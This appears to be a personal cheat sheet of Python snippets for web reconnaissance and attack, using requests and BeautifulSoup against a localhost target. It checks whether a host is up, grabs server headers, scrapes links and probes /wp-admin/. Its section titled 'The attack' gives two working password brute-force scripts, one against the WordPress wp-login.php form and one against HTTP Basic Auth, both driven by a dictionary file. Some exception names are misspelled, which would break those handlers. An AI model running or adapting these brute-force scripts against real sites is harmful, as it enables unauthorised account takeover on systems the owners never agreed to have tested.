#beautifulsoup #bs4 #requests #html

### Check if host is up

```python
from http.client import *

host = "127.0.0.1"
port = 80

try:
    connection = HTTPConnection(host,port)
    connection.request('GET','/')
    response = connection.getresponse()
    print("Host is up")
    
except ConenctionRefusedError:
    print("Host is down")
```

or simply 
```python
import requests

resp = requests.get('http://localhost')

print(resp)

```


### Info Gathering
```python
import requests
r = requests.get("http://localhost")
print(r.headers['server'])
```

```python
print(r.content)
```

### BS4 webscraping

Make the soup yum

```python
from bs4 import *
soup = BeautifulSoup(r.content,'html')
print(soup)

```

find stuff (ie all links available, all images, title)
```python
print(soup.title)

for i in soup.find_all("img"):
    print (i.get('src'))


urls = []
for i in soup.find_all("a"):
    if (i.get('href') not in urls):
        urls.append(i.get('href'))
    else:
        continue
for i in soup.find_all("link"):
    if (i.get('href') not in urls):
        urls.append(i.get('href'))
    else:
        continue
print(urls)   


```

### Test connections to found urls

```python
try:
    connection = HTTPConnection(host,port)
    connection.request('GET','/wp-admin/')
    response = connection.getresponse()
    print("yes")
    
except ConenctionRefusedError:
    print("no")

```
cool.

# The attack
## Brute force login

```python
import requests

pdicts = "password_dictionary.txt"
opendict = open(pdicts).readlines()

for i in opendict:
    print("Testing: ", i )
    r= requests.post('http://localhost/wp-login.php', data={"log": "admin", "pwd": i })
    if ("ERROR" not in r.text):
        print(i)
        break

```


## Test entry into user page
```python
import requests
from bs4 import BeautifulSoup

r = requests.get("http://localhost/token/index.html")
soup = BeautifulSoup(r.text,"html.parser")

print(soup)
print(r.headers)
```



## Break into page using auth + password breaker

```python
import requests
from bs4 import BeautifulSoup

dicts = "password_dictionary.txt"
username = 'anon'
url = "http://localhost/token/index.html"

lines = [items.rstrip('\n') for items in open(dicts)]


for password in lines:
    print("trying:", password)
    auth = requests.auth.HTTPBasicAuth(username, password )
    r = requests.get(url=url, auth = auth , verify = False , timeout = 5)
        
    
    if "Authorization Required" not in str(r.text):
        print("password is" , password)
        
        soup = BeautifulSoup(r.text,"html.parser")
        print(soup.prettify())
        
        break
        
```